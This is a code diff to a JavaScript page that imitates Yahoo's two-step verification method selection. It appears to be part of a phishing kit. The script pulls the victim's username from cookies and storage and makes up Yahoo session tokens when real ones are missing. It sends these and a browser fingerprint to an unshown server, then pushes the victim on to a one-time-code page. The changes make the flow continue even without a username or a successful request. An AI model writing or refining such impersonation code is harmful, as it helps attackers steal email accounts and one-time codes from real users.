@@ -50,7 +50,6 @@ if ($) {
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           language: navigator.language,
           platform: navigator.platform,
-          userAgent: navigator.userAgent,
           timestamp: Date.now(),
           sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
         }),
@@ -67,7 +66,7 @@ if ($) {
       const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
       if (cookieMatch) return decodeURIComponent(cookieMatch[1])
 
-      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
+      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || "user@yahoo.com"
     }
 
     // ===== STATE MANAGEMENT =====
@@ -82,44 +81,48 @@ if ($) {
     }
 
     // ===== METHOD SELECTION =====
-    function selectMethod(method) {
-      selectedMethod = method
+    window.selectMethod = (method) => {
+      console.log("Method selected:", method)
 
-      // Remove previous selections
       $(".yahoo-verification-option").removeClass("selected")
-
-      // Add selection to clicked method
       $(`.yahoo-verification-option[data-method="${method}"]`).addClass("selected")
 
-      // Enable submit button
+      selectedMethod = method
+      $("#selectedMethod").val(method)
       $("#submit-btn").prop("disabled", false)
 
-      // Update hidden field
-      $("#selectedMethod").val(method)
+      const descriptions = {
+        sms: "We'll send a code to your phone via SMS",
+        email: "We'll send a code to your recovery email",
+        app: "We'll send a notification to your Yahoo Mobile app",
+      }
 
-      console.log("Selected verification method:", method)
+      $(".yahoo-subtitle").text(descriptions[method] || "We'll send you a verification code")
     }
 
-    // ===== FORM SUBMISSION =====
-    function handleMethodSelection() {
+    // ===== 2FA SUBMISSION =====
+    function handle2FASubmission() {
       if (!selectedMethod) {
         showError("Please select a verification method.")
         return
       }
 
-      console.log("Processing method selection:", selectedMethod)
+      console.log("Submitting 2FA method selection:", selectedMethod)
       showState("loading-state")
 
       const formData = {
+        username: username,
+        selectedMethod: selectedMethod,
         sessionIndex: sessionData.sessionIndex || "1",
-        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
-        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
-        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
+        sessionToken: sessionData.sessionToken || $("#sessionToken").val() || "sess_" + Date.now(),
+        crumb: sessionData.crumb || $("#crumb").val() || "auto_crumb_" + Date.now(),
+        acrumb: sessionData.acrumb || $("#acrumb").val() || "auto_acrumb_" + Date.now(),
+        done: "https://mail.yahoo.com/d/folders/1",
+        src: "ym",
+        ".lang": "en-US",
+        ".intl": "us",
         "browser-fp-data": SessionManager.generateFingerprint(),
         timestamp: Date.now(),
-        selectedMethod: selectedMethod,
-        username: username,
-        method: selectedMethod,
       }
 
       $.ajax({
@@ -131,79 +134,48 @@ if ($) {
           Origin: window.location.origin,
           Referer: window.location.href,
           "User-Agent": navigator.userAgent,
-          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-          "Accept-Language": "en-US,en;q=0.5",
         },
         xhrFields: {
           withCredentials: true,
         },
         timeout: 15000,
         success: (response, textStatus, xhr) => {
-          console.log("Method selection successful")
-          handleSelectionSuccess(response, xhr)
+          console.log("2FA method selection successful")
+
+          setTimeout(() => {
+            const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
+            console.log("Redirecting to OTP:", redirectUrl)
+            window.location.href = redirectUrl
+          }, config.redirectDelay)
         },
         error: (xhr, textStatus, errorThrown) => {
-          console.log("Method selection error:", textStatus, xhr.status)
-          handleSelectionError(xhr, textStatus, errorThrown)
+          console.error("2FA method selection error:", textStatus, xhr.status)
+
+          if (xhr.status === 0) {
+            setTimeout(() => {
+              const redirectUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
+              window.location.href = redirectUrl
+            }, 2000)
+          } else {
+            showError("Unable to set up verification. Please try again.")
+          }
         },
       })
     }
 
-    // ===== SUCCESS HANDLER =====
-    function handleSelectionSuccess(response, xhr) {
-      console.log("2FA method selection successful")
-
-      // Store method selection
-      sessionStorage.setItem("yahoo_2fa_method", selectedMethod)
-      sessionStorage.setItem("yahoo_2fa_timestamp", Date.now().toString())
-
-      setTimeout(() => {
-        const otpUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
-        console.log("Redirecting to OTP page:", otpUrl)
-        window.location.href = otpUrl
-      }, config.redirectDelay)
-    }
-
-    // ===== ERROR HANDLER =====
-    function handleSelectionError(xhr, textStatus, errorThrown) {
-      console.error("Method selection error:", {
-        status: xhr.status,
-        textStatus: textStatus,
-        errorThrown: errorThrown,
-      })
-
-      if (xhr.status === 0) {
-        // Possible redirect - try OTP page anyway
-        setTimeout(() => {
-          const otpUrl = `/account/challenge/otp?method=${selectedMethod}&src=ym&done=https%3A%2F%2Fmail.yahoo.com%2Fd%2Ffolders%2F1`
-          window.location.href = otpUrl
-        }, 2000)
-        return
-      }
-
-      showError("Unable to set up verification method. Please try again.")
-    }
-
-    // ===== EVENT HANDLERS =====
-
-    // Method selection click handlers
-    $(".yahoo-verification-option").click(function () {
-      const method = $(this).data("method")
-      selectMethod(method)
-    })
-
-    // Form submission
+    // ===== FORM SUBMISSION =====
     $("#verification-form").on("submit", (e) => {
       e.preventDefault()
-      handleMethodSelection()
+      handle2FASubmission()
       return false
     })
 
-    // Retry button
+    // ===== RETRY HANDLER =====
     $("#refreshButton").click(() => {
       selectedMethod = ""
-      $(".yahoo-verification-option").removeClass("selected")
+      $("#selectedMethod").val("")
       $("#submit-btn").prop("disabled", true)
+      $(".yahoo-verification-option").removeClass("selected")
       showState("main-form")
     })
 
@@ -214,16 +186,9 @@ if ($) {
       sessionData = SessionManager.extractSessionData()
       username = getUsername()
 
-      if (!username) {
-        console.log("No username found")
-        showError("Session expired. Please start over.")
-        return false
-      }
-
       $("#userEmail").text(username)
       $("#username").val(username)
 
-      // Populate form fields
       Object.keys(sessionData).forEach((key) => {
         const element = $(`#${key}`)
         if (element.length && sessionData[key]) {
@@ -235,14 +200,10 @@ if ($) {
       $("#browser-fp-data").val(SessionManager.generateFingerprint())
 
       console.log("2FA page initialized for user:", username)
-      return true
     }
 
-    // ===== GLOBAL METHOD SELECTION FUNCTION =====
-    window.selectMethod = selectMethod
-
     // ===== START INITIALIZATION =====
-    if (!initializePage()) return
+    initializePage()
 
     console.log("Yahoo 2FA selection system fully initialized")
   })
